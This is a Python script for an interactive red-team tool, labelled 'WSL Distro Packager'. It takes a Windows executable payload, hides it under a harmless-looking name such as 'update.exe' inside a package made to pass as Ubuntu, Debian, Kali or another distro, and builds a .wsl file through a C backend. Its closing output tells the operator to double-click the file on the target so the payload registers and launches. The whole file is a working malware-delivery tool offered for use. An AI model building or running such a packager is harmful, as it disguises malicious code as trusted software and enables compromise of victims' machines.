#!/usr/bin/env python3

import os
import sys
import shutil
import subprocess
import platform
import threading
import itertools

def _c(code, text):
    if not sys.stdout.isatty():
        return text
    return f"\033[{code}m{text}\033[0m"

def cyan(t):   return _c("36;1", t)
def yellow(t): return _c("33;1", t)
def green(t):  return _c("32;1", t)
def red(t):    return _c("31;1", t)
def white(t):  return _c("97;1", t)
def dim(t):    return _c("2",    t)

BANNER = r"""
   ██████╗██╗   ██╗██████╗  █████╗ ███╗   ██╗    ███████╗██╗ ██████╗ ██╗  ██╗████████╗
  ██╔════╝██║   ██║██╔══██╗██╔══██╗████╗  ██║    ██╔════╝██║██╔════╝ ██║  ██║╚══██╔══╝
  ██║     ██║   ██║██████╔╝███████║██╔██╗ ██║    █████╗  ██║██║  ███╗███████║   ██║
  ██║     ██║   ██║██╔══██╗██╔══██║██║╚██╗██║    ██╔══╝  ██║██║   ██║██╔══██║   ██║
  ╚██████╗╚██████╔╝██████╔╝██║  ██║██║ ╚████║    ███████╗██║╚██████╔╝██║  ██║   ██║
   ╚═════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝    ╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝
"""

def print_banner():
    os.system("cls" if platform.system() == "Windows" else "clear")
    print(cyan(BANNER))
    print(f"  {dim('WSL Distro Packager  Red Team Research')}  {yellow('v2.0')}")
    print(f"  {dim('Author :')}  {white('Maverick')}")
    print(f"  {dim('GitHub :')}  {cyan('https://github.com/shaheeryasirofficial')}")
    print(f"\n{dim('─' * 89)}\n")

def box_header(title):
    print(f"\n  {cyan('┌─')} {white(title)}")

def box_option(n, label):
    print(f"  {cyan('│')}  {yellow(f'[{n}]')}  {label}")

def box_note(note):
    print(f"  {cyan('│')}  {dim(note)}")

def box_footer():
    print(f"  {dim(cyan('└' + '─' * 50))}")

def prompt(label):
    try:
        return input(f"  {yellow(label)} ").strip()
    except (KeyboardInterrupt, EOFError):
        print(f"\n  {yellow('[!]')} Aborted.")
        sys.exit(0)

def prompt_path(label):
    while True:
        raw = prompt(label).strip('"').strip("'")
        if os.path.isfile(raw):
            return raw
        print(f"  {red('[!]')} File not found: {raw}")

def prompt_choice(label, valid):
    while True:
        ans = prompt(label).lower()
        if ans in valid:
            return ans
        print(f"  {red('[!]')} Enter one of: {', '.join(valid)}")

DISTROS = [
    ("ubuntu2204", "Ubuntu 22.04.3 LTS"),
    ("ubuntu2004", "Ubuntu 20.04.6 LTS"),
    ("debian",     "Debian GNU/Linux"),
    ("kali",       "Kali Linux Rolling"),
    ("opensuse",   "openSUSE Leap 15.5"),
    ("fedora",     "Fedora Linux 39"),
]

def find_backend():
    names = ["cuban8-pack.exe", "cuban8-pack"] \
            if platform.system() == "Windows" \
            else ["cuban8-pack"]
    script_dir = os.path.dirname(os.path.abspath(__file__))
    for name in names:
        for candidate in [
            os.path.join(script_dir, name),
            os.path.join(script_dir, "c", name),
        ]:
            if os.path.isfile(candidate):
                return candidate
        found = shutil.which(name)
        if found:
            return found
    return None

def step_distro():
    box_header("Spoof Identity")
    for i, (did, dname) in enumerate(DISTROS, 1):
        box_option(i, dname)
    box_footer()
    valid = [str(i) for i in range(1, len(DISTROS) + 1)]
    choice = int(prompt_choice(f"Select [1-{len(DISTROS)}] »", valid))
    return DISTROS[choice - 1]

def step_payload_path():
    box_header("Payload Path")
    box_footer()
    return prompt_path("Path to EXE payload »")

def step_payload_name():
    default = "update.exe"
    box_header("Filename inside rootfs")
    box_note(f"Leave blank for default: {default}")
    box_footer()
    raw = prompt(f"Name [{default}] »")
    return raw if raw else default

def step_output(distro_id):
    default = f"{distro_id}.wsl"
    box_header("Output Path")
    box_note(f"Leave blank for default: {default}")
    box_footer()
    raw = prompt(f"Output [{default}] »")
    return raw if raw else default

def step_confirm(payload, name, distro_name, output):
    print()
    print(f"  {cyan('┌─')} {white('Build Summary')}")
    print(f"  {cyan('│')}  Payload path  : {white(payload)}")
    print(f"  {cyan('│')}  Name in rootfs: {white(name)}")
    print(f"  {cyan('│')}  Spoof identity: {yellow(distro_name)}")
    print(f"  {cyan('│')}  Output file   : {white(output)}")
    print(f"  {dim(cyan('└' + '─' * 50))}")
    print()
    choice = prompt_choice("Build? [y/n] »", ["y", "n", "yes", "no"])
    return choice in ("y", "yes")

class Spinner:
    def __init__(self, msg):
        self._msg    = msg
        self._stop   = threading.Event()
        self._thread = threading.Thread(target=self._spin, daemon=True)

    def _spin(self):
        frames = itertools.cycle("⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏")
        while not self._stop.is_set():
            frame = next(frames)
            print(f"\r  {cyan(frame)} {self._msg}   ", end="", flush=True)
            self._stop.wait(0.08)
        print(f"\r  {green('[+]')} {self._msg}   ")

    def start(self): self._thread.start()
    def stop(self):  self._stop.set(); self._thread.join()

def run_build(backend, payload, name, distro_id, output):
    spin = Spinner("Assembling .wsl package...")
    spin.start()
    try:
        result = subprocess.run(
            [backend, payload, name, distro_id, output],
            capture_output=True, text=True
        )
    finally:
        spin.stop()
    for line in result.stderr.splitlines():
        if line.startswith("[+]"):
            print(f"  {green('[+]')} {line[4:]}")
        elif line.startswith("[-]"):
            print(f"  {red('[-]')} {line[4:]}")
        elif line.startswith("[*]"):
            print(f"  {cyan('[*]')} {line[4:]}")
        else:
            print(f"       {line}")
    return result.returncode == 0

def print_result(name, distro_name, output):
    size = os.path.getsize(output) if os.path.isfile(output) else 0
    print()
    print(f"  {green('┌─')} {white('Output')}")
    print(f"  {green('│')}  File     : {white(output)}")
    print(f"  {green('│')}  Size     : {size:,} bytes")
    print(f"  {green('│')}  Identity : {yellow(distro_name)}")
    print(f"  {green('│')}  Payload  : /root/{white(name)}")
    print(f"  {dim(green('└' + '─' * 50))}")
    print()
    fname = os.path.basename(output)
    print(f"  {cyan('[*]')} Double-click {white(fname)} on the target to register and launch.\n")

def main():
    print_banner()

    backend = find_backend()
    if not backend:
        print(f"  {red('[-]')} cuban8-pack not found.")
        print(f"       Build it first:")
        print(f"         Linux  : {dim('gcc -O2 -o cuban8-pack c/cuban8_pack.c')}")
        print(f"         Windows: {dim('x86_64-w64-mingw32-gcc -O2 -o cuban8-pack.exe c/cuban8_pack.c')}")
        sys.exit(1)

    print(f"  {green('[+]')} Backend : {dim(backend)}\n")

    distro_id, distro_name = step_distro()
    payload_path           = step_payload_path()
    payload_name           = step_payload_name()
    output_path            = step_output(distro_id)

    with open(payload_path, "rb") as f:
        magic = f.read(2)
    if magic != b"MZ":
        print(f"\n  {red('[-]')} Not a PE binary (no MZ magic).")
        sys.exit(1)

    size = os.path.getsize(payload_path)
    print(f"\n  {green('[+]')} PE payload verified ({size:,} bytes)")

    if not step_confirm(payload_path, payload_name, distro_name, output_path):
        print(f"\n  {yellow('[!]')} Aborted.\n")
        sys.exit(0)

    print()
    ok = run_build(backend, payload_path, payload_name, distro_id, output_path)

    if not ok:
        print(f"\n  {red('[-]')} Build failed. Check the errors above.\n")
        sys.exit(1)

    print_result(payload_name, distro_name, output_path)

if __name__ == "__main__":
    main()
